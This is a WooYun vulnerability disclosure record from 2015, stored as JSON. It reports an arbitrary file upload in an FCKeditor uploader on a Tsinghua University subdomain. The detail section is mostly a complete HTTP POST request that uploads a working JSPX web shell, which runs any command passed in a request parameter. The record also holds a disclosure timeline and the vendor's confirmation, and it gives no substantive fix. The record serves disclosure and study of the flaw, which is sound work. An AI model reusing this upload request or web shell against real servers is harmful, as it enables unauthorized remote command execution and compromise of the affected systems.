{"id": 30593, "wybug_id": "wooyun-2015-0116223", "wybug_title": "清华大学某站存在上传漏洞可获取webshell", "wybug_corp": "清华大学", "wybug_author": "路人甲", "wybug_date": "2015-05-26 14:44", "wybug_open_date": "2015-07-12 09:08", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向公众公开  简要描述： 存在上传，可获取webshell 详细说明：  POST //JournalX_gclx//secure/admin/fckeditor/editor/filemanager/upload/simpleuploader?Type=File HTTP/1.1Accept: text/html, application/xhtml+xml, */*Content-Type: multipart/form-data; boundary=---------------------------7de1b519306dcUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Host: gclx.tsinghua.edu.cnExpect: 100-continueContent-Length: 1311-----------------------------7de1b519306dcContent-Disposition: form-data; name=\"NewFile\"; filename=\"success.jspx\"application/octet-stream<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"          xmlns=\"http://www.w3.org/1999/xhtml\"          xmlns:c=\"http://java.sun.com/jsp/jstl/core\" version=\"1.2\">    <jsp:directive.page contentType=\"text/html\" pageEncoding=\"gb2312\"/>    <jsp:directive.page import=\"java.io.*\"/>    <html>        <head>            <title>jspx</title>        </head>        <body>            <jsp:scriptlet>               try {\t\tString cmd = request.getParameter(\"paxmac\");\t\tif (cmd !=null){\t\t\tProcess child = Runtime.getRuntime().exec(cmd);\t\t\tInputStream in = child.getInputStream();\t\t\tint c;\t\t\twhile ((c = in.read()) != -1) {\t\t\tout.print((char)c);\t\t\t}\t\t\tin.close();\t\t\ttry {\t\t\tchild.waitFor();\t\t\t} catch (InterruptedException e) {\t\t\te.printStackTrace();\t\t}\t\t}\t\t} catch (IOException e) {\t\tSystem.err.println(e);\t\t}            </jsp:scriptlet>        </body>    </html></jsp:root>-----------------------------7de1b519306dcContent-Disposition: form-data; name=\"id\"-----------------------------7de1b519306dcContent-Disposition: form-data; name=\"proxyurl\"-----------------------------7de1b519306dc--   漏洞证明：  \n\n   修复方案：  你懂的   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-05-28 09:06 厂商回复： 谢谢提醒，我们会尽快修复此漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}